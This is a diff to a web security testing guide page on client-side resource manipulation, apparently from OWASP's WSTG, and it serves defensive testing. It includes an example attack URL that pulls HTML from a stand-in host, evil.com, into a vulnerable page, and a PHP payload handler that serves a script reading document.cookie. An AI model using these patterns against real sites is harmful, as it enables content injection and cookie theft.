@@ -5,6 +5,8 @@ title: WSTG - Latest
 tags: WSTG
 
 ---
+
+{% include breadcrumb.html %}
 # Testing for Client-side Resource Manipulation
 
 |ID          |
@@ -64,18 +66,21 @@ Here is an example of a vulnerable page:
 
 The `location.hash` is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct `innerHTML`. An attacker could ask a victim to visit the following URL:
 
-`www.victim.com/\#http://evil.com/html.html`
+`www.victim.com/#http://evil.com/html.html`
 
-With the payload handler:
+With the payload handler for `html.html`:
 
 ```html
-http://evil.com/html.html
-----
 <?php
 header('Access-Control-Allow-Origin: http://www.victim.com');
 ?>
 <script>alert(document.cookie);</script>
 ```
+
+## Test Objectives
+
+- Identify sinks with weak input validation.
+- Assess the impact of the resource manipulation.
 
 ## How to Test
 
@@ -87,7 +92,7 @@ The following table shows possible injection points (sink) that should be checke
 | --------------- | ----------------------------------------- | ------ |
 | Frame           | iframe                                    | src    |
 | Link            | a                                         | href   |
-| AJAX Request    | `xhr.open(method, <i>\[url\]</i>, true);` | URL    |
+| AJAX Request    | `xhr.open(method, [url], true);` | URL    |
 | CSS             | link                                      | href   |
 | Image           | img                                       | src    |
 | Object          | object                                    | data   |
